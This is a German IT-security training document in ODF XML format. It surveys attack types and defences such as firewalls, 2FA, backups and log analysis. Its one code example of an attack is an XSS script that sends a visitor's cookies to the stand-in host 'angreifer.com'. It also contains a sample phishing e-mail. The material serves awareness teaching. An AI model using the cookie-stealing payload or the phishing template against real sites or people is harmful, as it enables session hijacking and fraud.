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Hackerangriffe und Schutzmaßnahmen</text:title></text:p>
      <text:p text:style-name="OrgTitle"/>
      <text:p text:style-name="OrgSubtitle">
<text:user-defined style:data-style-name="N0" text:name="subtitle">
IT-Sicherheit</text:user-defined>

</text:p>
      <text:p text:style-name="OrgSubtitle"/>
      <text:p text:style-name="OrgSubtitle"><text:initial-creator>ITT-Net-IS</text:initial-creator></text:p>
      <text:p text:style-name="OrgSubtitle"/>
      <text:h text:style-name="Heading_20_1_unnumbered" text:outline-level="1" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org6cc5364"/>
<text:bookmark text:name="org6cc5364"/>Einführung
<text:bookmark-end text:name="OrgXref.org6cc5364"/></text:h>
      <text:p text:style-name="Text_20_body">"Hackerangriff"bezeichnet einen Versuch,unbefugten Zugriff auf ein Computersystem,Netzwerk oder Daten zu erlangen.Während der Begriff "Hacker"ursprünglich Personen mit tiefgreifendem Technikverständnis beschrieb,wird er heute oft mit Cyberkriminellen assoziiert.
</text:p>
      <text:h text:style-name="Heading_20_1_unnumbered" text:outline-level="1" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org4cf4935"/>
<text:bookmark text:name="org4cf4935"/>Arten von Hackerangriffen
<text:bookmark-end text:name="OrgXref.org4cf4935"/></text:h>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgf6d0dd9"/>
<text:bookmark text:name="orgf6d0dd9"/>Phishing-Angriffe
<text:bookmark-end text:name="OrgXref.orgf6d0dd9"/></text:h>
      <text:p text:style-name="Text_20_body">Phishing zielt darauf ab,vertrauliche Informationen wie Passwörter oder Kreditkartendaten durch Täuschung zu erlangen.
</text:p>
      <text:p text:style-name="Text_20_body">"Phishing"kommt vom englischen "fishing"(Angeln) und bezeichnet den Versuch,Informationen "zu angeln",indem gefälschte Identitäten oder Websites verwendet werden.
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org5d18322"/>
<text:bookmark text:name="org5d18322"/>Phishing-Varianten
<text:bookmark-end text:name="OrgXref.org5d18322"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Spear-Phishing</text:span>:Zielt auf bestimmte Personen oder Organisationen ab
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Whaling</text:span>:Spezifisch auf hochrangige Führungskräfte ausgerichtet
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Smishing</text:span>:Phishing über SMS
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Vishing</text:span>:Phishing über Telefonanrufe (Voice-Phishing)
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org19c2826"/>
<text:bookmark text:name="org19c2826"/>Beispiel:Typische Phishing-E-Mail
<text:bookmark-end text:name="OrgXref.org19c2826"/></text:h>
      <text:p text:style-name="OrgFixedWidthBlock">Von: security@bank-service-verify.com</text:p>
      <text:p text:style-name="OrgFixedWidthBlock">Betreff: Dringende Sicherheitswarnung - Handlung erforderlich</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"/>
      <text:p text:style-name="OrgFixedWidthBlock">Sehr geehrter Kunde,</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"/>
      <text:p text:style-name="OrgFixedWidthBlock">Wir haben ungewöhnliche Aktivitäten auf Ihrem Konto festgestellt. </text:p>
      <text:p text:style-name="OrgFixedWidthBlock">Um eine Sperrung zu verhindern, bestätigen Sie bitte Ihre Identität unter:</text:p>
      <text:p text:style-name="OrgFixedWidthBlock">https://bank-verfication-secure.com/login</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"/>
      <text:p text:style-name="OrgFixedWidthBlock">Mit freundlichen Grüßen,</text:p>
      <text:p text:style-name="OrgFixedWidthBlockLastLine">Ihr Sicherheitsteam</text:p>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org4b4e8a9"/>
<text:bookmark text:name="org4b4e8a9"/>DDoS-Angriffe (Distributed Denial of Service)
<text:bookmark-end text:name="OrgXref.org4b4e8a9"/></text:h>
      <text:p text:style-name="Text_20_body">DDoS-Angriffe überlasten Systeme oder Netzwerke mit Anfragen,bis sie nicht mehr reagieren können.
</text:p>
      <text:p text:style-name="Text_20_body">"DDoS"steht für "Distributed Denial of Service".Der Angriff wird von vielen verschiedenen Quellen gleichzeitig ausgeführt,was ihn schwer zu blockieren macht.
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org7330b02"/>
<text:bookmark text:name="org7330b02"/>DDoS-Arten
<text:bookmark-end text:name="OrgXref.org7330b02"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Volumetrische Angriffe</text:span>:Überschwemmen Netzwerkbandbreite
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Protokollangriffe</text:span>:Ausnutzen von Schwachstellen in Netzwerkprotokollen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Anwendungsangriffe</text:span>:Zielen auf spezifische Anwendungen oder Dienste ab
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org3a53b6c"/>
<text:bookmark text:name="org3a53b6c"/>Social Engineering
<text:bookmark-end text:name="OrgXref.org3a53b6c"/></text:h>
      <text:p text:style-name="Text_20_body">Bei Social Engineering werden psychologische Manipulation eingesetzt,um Opfer zur Preisgabe vertraulicher Informationen zu bewegen.
</text:p>
      <text:p text:style-name="Text_20_body">"Social Engineering"bezeichnet Techniken der zwischenmenschlichen Manipulation,um Menschen dazu zu bringen,normale Sicherheitsmaßnahmen zu umgehen.
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org0a3a1ac"/>
<text:bookmark text:name="org0a3a1ac"/>Häufige Social Engineering-Taktiken
<text:bookmark-end text:name="OrgXref.org0a3a1ac"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Vorwand-Anrufe</text:span> ("Pretexting"):Erfundene Szenarien zur Informationsgewinnung
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Baiting</text:span>:Anbieten von etwas Verlockenden (z.B.kostenlose Downloads),um Schadsoftware zu verbreiten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Quid Pro Quo</text:span>:Versprechen eines Vorteils im Austausch für Informationen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Tailgating</text:span>:Unbefugtes Folgen einer autorisierten Person in gesicherte Bereiche
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org189aa45"/>
<text:bookmark text:name="org189aa45"/>Andere verbreitete Angriffsarten
<text:bookmark-end text:name="OrgXref.org189aa45"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">SQL-Injection</text:span>:Einschleusen von schädlichem SQL-Code in Datenbankanfragen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Cross-Site Scripting (XSS)</text:span>:Einbetten bösartiger Skripte in Webseiten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Man-in-the-Middle (MITM)</text:span>:Abfangen und möglicherweise Manipulieren von Kommunikation
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Brute-Force</text:span>:Systematisches Durchprobieren aller möglichen Passwörter
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Zero-Day-Exploits</text:span>:Ausnutzen unbekannter Sicherheitslücken
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org95a2a28"/>
<text:bookmark text:name="org95a2a28"/>Beispiel:Cross-Site Scripting (XSS)
<text:bookmark-end text:name="OrgXref.org95a2a28"/></text:h>
      <text:p text:style-name="OrgSrcBlock"><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">&lt;</text:span><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">!--<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">Böswilliger<text:s/>Kommentar<text:s/>auf<text:s/>einer<text:s/>Website</text:span><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace"><text:s/>--</text:span><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">&gt;</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock">&lt;<text:span text:style-name="OrgSrcFontLockFunctionNameFace">script</text:span>&gt;</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>document.addEventListener('DOMContentLoaded',<text:s/>function()<text:s/>{</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:s/><text:s/>var<text:s/>img<text:s/>=<text:s/>new<text:s/>Image();</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:s/><text:s/>img.src<text:s/>=<text:s/>'https://angreifer.com/stehlen?cookies='<text:s/>+<text:s/>encodeURIComponent(document.cookie);</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:s/><text:s/>img.style.display<text:s/>=<text:s/>'none';</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:s/><text:s/>document.body.appendChild(img);</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>});</text:p>
      <text:p text:style-name="OrgSrcBlockLastLine">&lt;/<text:span text:style-name="OrgSrcFontLockFunctionNameFace">script</text:span>&gt;</text:p>
      <text:h text:style-name="Heading_20_1_unnumbered" text:outline-level="1" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org3847914"/>
<text:bookmark text:name="org3847914"/>Schutzmaßnahmen gegen Hackerangriffe
<text:bookmark-end text:name="OrgXref.org3847914"/></text:h>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orga82133f"/>
<text:bookmark text:name="orga82133f"/>Technische Schutzmaßnahmen
<text:bookmark-end text:name="OrgXref.orga82133f"/></text:h>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgf619695"/>
<text:bookmark text:name="orgf619695"/>Firewalls und Netzwerksicherheit
<text:bookmark-end text:name="OrgXref.orgf619695"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Implementierung und Konfiguration von Firewalls
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Segmentierung von Netzwerken
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verwendung von Virtual Private Networks (VPNs)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Netzwerküberwachung
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Eine "Firewall"ist ein Sicherheitssystem,das den Netzwerkverkehr basierend auf vordefinierten Sicherheitsregeln überwacht und kontrolliert.
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org17c8573"/>
<text:bookmark text:name="org17c8573"/>Beispiel:Einfache iptables-Firewall-Konfiguration
<text:bookmark-end text:name="OrgXref.org17c8573"/></text:h>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">Grundlegende<text:s/>iptables-Firewall-Regeln</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">Standardrichtlinien:<text:s/>Alles<text:s/>ablehnen</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>iptables<text:s/>-P<text:s/>INPUT<text:s/>DROP</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>iptables<text:s/>-P<text:s/>FORWARD<text:s/>DROP</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>iptables<text:s/>-P<text:s/>OUTPUT<text:s/>ACCEPT</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">Lokale<text:s/>Verbindungen<text:s/>erlauben</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>iptables<text:s/>-A<text:s/>INPUT<text:s/>-i<text:s/>lo<text:s/>-j<text:s/>ACCEPT</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">Bestehende<text:s/>Verbindungen<text:s/>erlauben</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>iptables<text:s/>-A<text:s/>INPUT<text:s/>-m<text:s/>conntrack<text:s/>--ctstate<text:s/>ESTABLISHED,RELATED<text:s/>-j<text:s/>ACCEPT</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">SSH<text:s/>auf<text:s/>Port<text:s/>22<text:s/>erlauben</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>iptables<text:s/>-A<text:s/>INPUT<text:s/>-p<text:s/>tcp<text:s/>--dport<text:s/>22<text:s/>-j<text:s/>ACCEPT</text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">HTTP<text:s/>und<text:s/>HTTPS<text:s/>erlauben</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>iptables<text:s/>-A<text:s/>INPUT<text:s/>-p<text:s/>tcp<text:s/>--dport<text:s/>80<text:s/>-j<text:s/>ACCEPT</text:p>
      <text:p text:style-name="OrgSrcBlockLastLine"><text:s/><text:s/>iptables<text:s/>-A<text:s/>INPUT<text:s/>-p<text:s/>tcp<text:s/>--dport<text:s/>443<text:s/>-j<text:s/>ACCEPT</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgc593ecf"/>
<text:bookmark text:name="orgc593ecf"/>Aktualisierte Software und Patch-Management
<text:bookmark-end text:name="OrgXref.orgc593ecf"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Updates für Betriebssysteme und Software
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Automatisierte Patch-Management-Systeme
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Zeitnahe Anwendung sicherheitsrelevanter Updates
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org3c5b63a"/>
<text:bookmark text:name="org3c5b63a"/>Starke Authentifizierung
<text:bookmark-end text:name="OrgXref.org3c5b63a"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verwendung komplexer Passwörter
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Implementierung von Zwei-Faktor-Authentifizierung (2FA)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Biometrische Authentifizierungsmethoden
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Single Sign-On (SSO) mit starker Basisauthentifizierung
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">"Zwei-Faktor-Authentifizierung (2FA)"erfordert zwei unterschiedliche Authentifizierungsfaktoren:etwas,das man weiß (Passwort),besitzt (Smartphone) oder ist (Fingerabdruck).
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org6ab08a0"/>
<text:bookmark text:name="org6ab08a0"/>Verschlüsselung
<text:bookmark-end text:name="OrgXref.org6ab08a0"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Festplattenverschlüsselung
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verschlüsselung der Kommunikation (TLS/SSL)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">E-Mail-Verschlüsselung (PGP/GPG)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verschlüsselung von Backups
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org175546d"/>
<text:bookmark text:name="org175546d"/>Regelmäßige Backups
<text:bookmark-end text:name="OrgXref.org175546d"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">3-2-1-Backup-Strategie:3 Kopien,2 verschiedene Medien,1 Off-Site
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Tests der Wiederherstellungsprozesse
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Unveränderliche (immutable) Backups gegen Ransomware
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org279b2c4"/>
<text:bookmark text:name="org279b2c4"/>Organisatorische Schutzmaßnahmen
<text:bookmark-end text:name="OrgXref.org279b2c4"/></text:h>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org0ef6fdb"/>
<text:bookmark text:name="org0ef6fdb"/>Sicherheitsrichtlinien und -verfahren
<text:bookmark-end text:name="OrgXref.org0ef6fdb"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Dokumentierte Sicherheitsrichtlinien
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Klare Verantwortlichkeiten und Rollen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Incident-Response-Pläne
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Sicherheitsaudits
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">"Incident-Response-Plan"ist ein dokumentierter Ablaufplan,der festlegt,wie eine Organisation auf Sicherheitsvorfälle reagieren soll.
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org61cfa8b"/>
<text:bookmark text:name="org61cfa8b"/>Mitarbeiterschulung und Sensibilisierung
<text:bookmark-end text:name="OrgXref.org61cfa8b"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Sicherheitsschulungen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Phishing-Simulationen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Sicherheitsbewusstsein im Arbeitsalltag fördern
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Klare Meldewege für verdächtige Aktivitäten
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgc9861dc"/>
<text:bookmark text:name="orgc9861dc"/>Beispiel:Checkliste für Sicherheitsbewusstsein
<text:bookmark-end text:name="OrgXref.orgc9861dc"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Verdächtige E-Mails an IT-Sicherheit melden
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Keine unbekannten USB-Sticks verwenden
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Starke,einzigartige Passwörter für jeden Dienst nutzen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Zwei-Faktor-Authentifizierung aktivieren
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Öffentliches WLAN nur mit VPN nutzen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Bildschirm sperren,wenn Arbeitsplatz verlassen wird
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Regelmäßig an Sicherheitsschulungen teilnehmen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="OrgCode">[ ] </text:span>Vorsicht bei unerwarteten Anhängen oder Links
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org2267b16"/>
<text:bookmark text:name="org2267b16"/>Zugriffskontrollen und Berechtigungsverwaltung
<text:bookmark-end text:name="OrgXref.org2267b16"/></text:h>
      <text:p text:style-name="Text_20_body">EXAMPLE
</text:p>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Prinzip der geringsten Berechtigung
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Überprüfung von Zugriffsrechten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Prozesse für Onboarding und Offboarding von Mitarbeitern
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Privilegierte Konten besonders schützen
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Das "Prinzip der geringsten Berechtigung"(Principle of Least Privilege) besagt,dass Benutzer nur die minimal notwendigen Rechte erhalten sollten,um ihre Aufgaben zu erfüllen.
</text:p>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org3915072"/>
<text:bookmark text:name="org3915072"/>Überwachung und Reaktion
<text:bookmark-end text:name="OrgXref.org3915072"/></text:h>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org22c36c9"/>
<text:bookmark text:name="org22c36c9"/>Sicherheitsüberwachung
<text:bookmark-end text:name="OrgXref.org22c36c9"/></text:h>
      <text:p text:style-name="Text_20_body">EXAMPLE
</text:p>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Intrusion Detection/Prevention Systeme (IDS/IPS)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Security Information and Event Management (SIEM)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Anomalieerkennung
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Honeypots zur Angriffserkennung
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">"SIEM"(Security Information and Event Management) sammelt und analysiert Sicherheitsdaten aus verschiedenen Quellen,um Bedrohungen zu erkennen und darauf zu reagieren.
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgb382f6f"/>
<text:bookmark text:name="orgb382f6f"/>Beispiel:Log-Analyse mit ELK Stack
<text:bookmark-end text:name="OrgXref.orgb382f6f"/></text:h>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">Beispiel<text:s/>für<text:s/>einfache<text:s/>Analyse<text:s/>von<text:s/>Zugriffsprotokollen<text:s/>mit<text:s/>grep</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:span text:style-name="OrgSrcFontLockCommentDelimiterFace">#<text:s/></text:span><text:span text:style-name="OrgSrcFontLockCommentFace">Suche<text:s/>nach<text:s/>fehlgeschlagenen<text:s/>SSH-Anmeldeversuchen</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/>grep<text:s/><text:span text:style-name="OrgSrcFontLockStringFace">"Failed<text:s/>password"</text:span><text:s/>/var/log/auth.log<text:s/>|<text:s/><text:span text:style-name="OrgSrcShEscapedNewline">\</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:s/><text:s/><text:s/><text:s/>awk<text:s/><text:span text:style-name="OrgSrcFontLockStringFace">'{print<text:s/>$11}'</text:span><text:s/>|<text:s/><text:span text:style-name="OrgSrcShEscapedNewline">\</text:span></text:p>
      <text:p text:style-name="OrgSrcBlock"><text:s/><text:s/><text:s/><text:s/><text:s/><text:s/>sort<text:s/>|<text:s/>uniq<text:s/>-c<text:s/>|<text:s/>sort<text:s/>-nr<text:s/>|<text:s/><text:span text:style-name="OrgSrcShEscapedNewline">\</text:span></text:p>
      <text:p text:style-name="OrgSrcBlockLastLine"><text:s/><text:s/><text:s/><text:s/><text:s/><text:s/>head<text:s/>-n<text:s/>10</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgc4a9d8f"/>
<text:bookmark text:name="orgc4a9d8f"/>Incident Response
<text:bookmark-end text:name="OrgXref.orgc4a9d8f"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Festgelegte Reaktionspläne für verschiedene Angriffsszenarien
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Klar definierte Rollen und Verantwortlichkeiten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Kommunikationsstrategien während eines Vorfalls
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Forensische Untersuchungsprozesse
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orga63b598"/>
<text:bookmark text:name="orga63b598"/>Penetrationstests und Schwachstellenscans
<text:bookmark-end text:name="OrgXref.orga63b598"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Schwachstellenscans
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Externe Penetrationstests
